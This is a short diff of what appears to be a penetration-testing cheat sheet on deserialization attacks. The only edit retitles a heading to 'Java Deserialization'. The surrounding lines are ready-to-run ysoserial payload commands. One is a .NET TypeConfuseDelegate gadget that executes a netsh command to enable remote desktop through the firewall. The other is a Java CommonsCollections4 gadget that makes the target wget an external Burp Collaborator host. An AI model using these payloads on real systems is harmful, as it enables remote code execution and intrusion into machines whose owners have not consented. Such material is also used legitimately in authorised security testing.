@@ -11,7 +11,7 @@ ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 "
 ```
-# Deserialization 
+# Java Deserialization 
 ```
 
 java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget sdfsfdoztjxibkocen698fskck0ehs8yymn.burpcollaborator.net"
